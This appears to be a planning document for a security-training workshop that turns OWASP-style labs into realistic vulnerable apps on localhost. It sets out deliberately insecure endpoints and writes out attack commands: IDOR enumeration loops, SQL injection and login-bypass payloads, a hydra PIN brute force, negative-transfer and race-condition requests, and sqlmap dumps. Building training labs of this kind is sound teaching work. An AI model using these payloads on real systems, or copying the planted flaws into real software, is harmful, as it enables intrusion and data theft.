# Lab Refactoring Plan: Realistic Attack Targets

## Problem Statement
Current labs are too self-explanatory with:
- Tutorial pages explaining vulnerabilities
- Interactive web forms that solve challenges
- "Click here for Lab 1/2/3" navigation
- Step-by-step guidance on exploitation

## Goal
Transform labs into realistic vulnerable applications that require actual security tools:
- **gobuster** - Directory/endpoint enumeration
- **curl** - API testing, parameter manipulation, header injection
- **crackstation.net** - Hash identification and cracking
- **john the ripper** - Password cracking
- **hydra** - Brute force attacks

## Design Principles
1. **No tutorials** - Remove all `/example`, `/tutorial` endpoints
2. **No self-solving interfaces** - No forms that explain what to inject
3. **Discoverable via tools** - Hidden endpoints found with gobuster
4. **Realistic appearance** - Look like actual corporate applications
5. **Tool-driven exploitation** - Require command-line tools to exploit

---

## A01: Broken Access Control (TechCorp HR)

### Current State
- Home page with "Lab 1/2/3" links
- `/example` tutorial explaining IDOR
- Interactive forms with hints
- URLs: `/lab1`, `/lab2`, `/lab3`

### Target State
**Simplified Structure:**
```
/                     → Employee portal landing (login page or dashboard)
/employees            → Public employee directory (shows some employees)
/api/users/:id        → User profile API (IDOR vulnerability)
/admin                → HR admin dashboard (privilege escalation)
/api/admin/users      → Admin-only API endpoint
```

**Student Attack Path:**
1. **Reconnaissance**: Browse `/employees` to see employee listings
2. **Discovery**: Use `gobuster` to find `/api/users/` endpoint
3. **Enumeration**: Use `curl` to iterate through user IDs:
   ```bash
   for i in {1..10}; do curl http://localhost:3001/api/users/$i; done
   ```
4. **Exploitation**: Find admin user (ID 4) with sensitive data
5. **Privilege Escalation**: Use `curl` to manipulate `user_id` parameter:
   ```bash
   curl http://localhost:3001/admin?user_id=4
   ```

**What to Remove:**
- [ ] Delete `/example` endpoint entirely
- [ ] Remove `/lab1`, `/lab2`, `/lab3` navigation cards from home page
- [ ] Strip tutorial content explaining IDOR
- [ ] Remove interactive "try this injection" forms

**What to Keep/Add:**
- [ ] Simple employee directory (visible list)
- [ ] `/api/users/:id` endpoint (returns JSON, no HTML explanation)
- [ ] `/admin` route (checks user_id from query param)
- [ ] Flag in admin user's profile data

---

## A02: Security Misconfiguration (CloudDeploy)

### Current State
- Tutorial pages explaining configuration exposure
- `/lab1`, `/lab2`, `/lab3` structure
- Forms showing what to look for

### Target State
**Simplified Structure:**
```
/                     → CloudDeploy platform console
/dashboard            → User dashboard
/.env                 → Exposed environment file (gobuster discovery)
/api/config           → Debug endpoint leaking config
/admin                → Admin panel (default creds)
```

**Student Attack Path:**
1. **Discovery**: Use `gobuster` with common file list:
   ```bash
   gobuster dir -u http://localhost:3002 -w /usr/share/wordlists/dirb/common.txt -x txt,env,conf
   ```
2. **Exploitation**: Find `/.env` file with AWS credentials
3. **Config Leak**: Access `/api/config` revealing database passwords
4. **Default Creds**: Try common credentials on `/admin`:
   ```bash
   curl -X POST http://localhost:3002/admin/login \
     -d "username=admin&password=admin123"
   ```

**What to Remove:**
- [ ] Delete tutorial explaining configuration files
- [ ] Remove step-by-step "find the .env file" guides
- [ ] Strip navigation to specific labs

**What to Keep/Add:**
- [ ] `/.env` file (served as static file if discovered)
- [ ] `/api/config` endpoint (returns JSON with credentials)
- [ ] `/admin` login with default password
- [ ] Flags in exposed configuration data

---

## A05: SQL Injection (ShopTech E-Commerce)

### Current State
- Tutorial explaining SQL injection syntax
- Interactive forms showing injection examples
- Pre-filled payloads like `admin@shoptech.com'--`

### Target State
**Simplified Structure:**
```
/                     → ShopTech product catalog
/products             → Browse products
/api/search?q=        → Search API (SQL injection point)
/login                → Customer login (auth bypass)
/api/products?id=     → Product details (UNION injection)
```

**Student Attack Path:**
1. **Testing**: Use `curl` to test search for SQL errors:
   ```bash
   curl "http://localhost:3005/api/search?q=test'"
   ```
2. **Enumeration**: Determine column count:
   ```bash
   curl "http://localhost:3005/api/search?q=' ORDER BY 5--"
   ```
3. **UNION Injection**: Extract database structure:
   ```bash
   curl "http://localhost:3005/api/search?q=' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--"
   ```
4. **Auth Bypass**: Login as admin without password:
   ```bash
   curl -X POST http://localhost:3005/login \
     -d "email=admin@shoptech.com'--&password=anything"
   ```
5. **Data Exfiltration**: Extract customer credit cards from database

**What to Remove:**
- [ ] Delete SQL tutorial page with syntax examples
- [ ] Remove forms pre-filled with injection payloads
- [ ] Strip "try this: admin@shoptech.com'--" hints from HTML
- [ ] Remove interactive injection demonstrations

**What to Keep/Add:**
- [ ] Simple product search interface
- [ ] Vulnerable `/api/search` endpoint (concatenates user input)
- [ ] Login form (no hints)
- [ ] Flags in `sensitive_data` table (extracted via UNION)

---

## A06: Insecure Design (SecureBank)

### Current State
- Tutorial explaining race conditions
- Forms demonstrating price manipulation
- Step-by-step guides for exploitation

### Target State
**Simplified Structure:**
```
/                     → SecureBank online banking
/login                → Customer login
/account              → Account balance and transactions
/api/transfer         → Fund transfer endpoint (race condition)
/api/verify           → PIN verification (no rate limiting)
```

**Student Attack Path:**
1. **Rate Limit Testing**: Use `hydra` to brute force PIN:
   ```bash
   hydra -l user -P pins.txt localhost -s 3006 http-post-form "/api/verify:pin=^PASS^:incorrect"
   ```
2. **Price Manipulation**: Use `curl` to modify transaction amounts:
   ```bash
   curl -X POST http://localhost:3006/api/transfer \
     -H "Content-Type: application/json" \
     -d '{"from":"checking","to":"savings","amount":-1000}'
   ```
3. **Race Condition**: Send concurrent withdrawal requests:
   ```bash
   for i in {1..10}; do 
     curl -X POST http://localhost:3006/api/withdraw \
       -d "amount=300" &
   done
   ```

**What to Remove:**
- [ ] Delete tutorial explaining race conditions
- [ ] Remove forms with "try negative amounts" hints
- [ ] Strip step-by-step exploitation guides
- [ ] Remove interactive examples showing vulnerabilities

**What to Keep/Add:**
- [ ] Simple banking interface
- [ ] `/api/transfer` endpoint (no server-side validation)
- [ ] `/api/verify` endpoint (no rate limiting)
- [ ] `/api/withdraw` endpoint (race condition vulnerability)
- [ ] Flags returned on successful exploits

---

## Implementation Strategy

### Phase 1: Strip Tutorial Content (All Labs)
For each lab (`a01`, `a02`, `a05`, `a06`):
1. Remove `/example` and `/tutorial` endpoints
2. Delete all tutorial HTML explaining vulnerabilities
3. Remove navigation cards linking to "Lab 1/2/3"
4. Strip hint text from forms and responses

### Phase 2: Simplify Home Pages
1. Create minimalist landing pages that look like real applications
2. Remove badges like "Tutorial", "Easy", "Medium", "Hard"
3. Add realistic navigation (Dashboard, Profile, Settings, etc.)
4. No mention of "labs" or "challenges"

### Phase 3: API-First Design
1. Move vulnerability exploitation to API endpoints
2. Return JSON responses (not HTML with explanations)
3. Make endpoints discoverable via gobuster
4. Add realistic error messages (no hints)

### Phase 4: Tool Integration Examples
Update instructor guides with tool commands:
```bash
# A01: IDOR enumeration
for id in {1..10}; do curl -s http://localhost:3001/api/users/$id | jq; done

# A02: Directory enumeration
gobuster dir -u http://localhost:3002 -w /usr/share/wordlists/dirb/common.txt

# A05: SQL injection testing
sqlmap -u "http://localhost:3005/api/search?q=test" --batch --dump

# A06: Race condition exploitation
seq 10 | xargs -I{} -P10 curl -X POST http://localhost:3006/api/withdraw -d "amount=300"
```

### Phase 5: Testing Checklist
- [ ] Can students discover hidden endpoints with gobuster?
- [ ] Do vulnerability exploits require curl/tool usage?
- [ ] Are flags obtainable only through exploitation?
- [ ] Do pages look like real applications (no "lab" branding)?
- [ ] Are instructor guides updated with tool commands?

---

## Expected Student Workflow

### Before (Current State)
1. Read tutorial explaining IDOR vulnerability
2. Click "try this payload" button
3. See flag displayed with explanation
4. Copy flag to portal

### After (Target State)
1. Browse application to understand functionality
2. Use `gobuster` to discover hidden endpoints
3. Use `curl` to test for vulnerabilities
4. Craft exploits using command-line tools
5. Extract flags from API responses
6. Document attack methodology
7. Submit flag to portal

---

## Instructor Guide Updates Required

Each instructor guide needs:
1. **Tool Requirements Section**:
   - gobuster installation
   - curl usage examples
   - hydra/john setup
   - crackstation.net access

2. **Reconnaissance Commands**:
   ```bash
   # Discover endpoints
   gobuster dir -u http://localhost:3001 -w common.txt
   
   # Test for errors
   curl http://localhost:3001/api/users/1
   ```

3. **Exploitation Walkthrough**:
   - Step-by-step tool usage
   - Example commands students should discover
   - Expected responses/outputs

4. **Flags Locations**:
   - Where flags are hidden (API responses, database dumps, etc.)
   - How to extract them using tools

---

## Questions to Resolve

1. **Authentication**: Should labs require login, or be open for testing?
   - **Recommendation**: Keep open for simplicity, focus on post-auth vulnerabilities

2. **Endpoint Discovery**: Should common paths be documented anywhere?
   - **Recommendation**: No - students use gobuster with standard wordlists

3. **Error Messages**: How verbose should error messages be?
   - **Recommendation**: Realistic (not helpful) - e.g., "Invalid request" vs "SQL syntax error at column 5"

4. **Multiple Flags**: Should each lab have one flag or multiple?
   - **Current**: Portal expects `/lab1`, `/lab2`, `/lab3` URLs with different flags
   - **Recommendation**: Keep 3 flags per topic but make them progressive discoveries

5. **Home Page**: Should `/` show anything, or require endpoint discovery?
   - **Recommendation**: Show realistic landing page, but no lab navigation

---

## Timeline Estimate

- **Phase 1 (Strip Tutorials)**: 2-3 hours
- **Phase 2 (Simplify Homes)**: 1 hour  
- **Phase 3 (API Design)**: 3-4 hours
- **Phase 4 (Tool Examples)**: 2 hours
- **Phase 5 (Testing)**: 2 hours

**Total**: ~10-12 hours of development work

---

## Success Criteria

- ✅ No tutorial pages explaining vulnerabilities
- ✅ No self-solving web forms
- ✅ All exploitation requires command-line tools
- ✅ Endpoints discoverable via gobuster
- ✅ Realistic corporate application appearance
- ✅ Flags hidden in API responses/databases
- ✅ Instructor guides show tool usage
- ✅ All portal URLs still functional (lab1/lab2/lab3)

---

## Open Questions for Instructor

1. **Portal URLs**: The portal points to `/lab1`, `/lab2`, `/lab3`. Should we:
   - A) Keep these as aliases (redirect to actual pages)
   - B) Update portal database to use realistic URLs
   - C) Make these return JSON with flags (API-only)

2. **Difficulty Progression**: Currently Lab 1=Easy, Lab 2=Medium, Lab 3=Hard. Should:
   - A) Keep this by making Lab 3 require multiple tool combinations
   - B) Make all labs equally challenging (just different techniques)

3. **Wordlists**: Should we provide custom wordlists, or expect students to use standard ones?
   - `/usr/share/wordlists/dirb/common.txt`
   - `/usr/share/seclists/Discovery/Web-Content/`

4. **Time Allocation**: How much time per lab in workshop?
   - This determines complexity level we should target
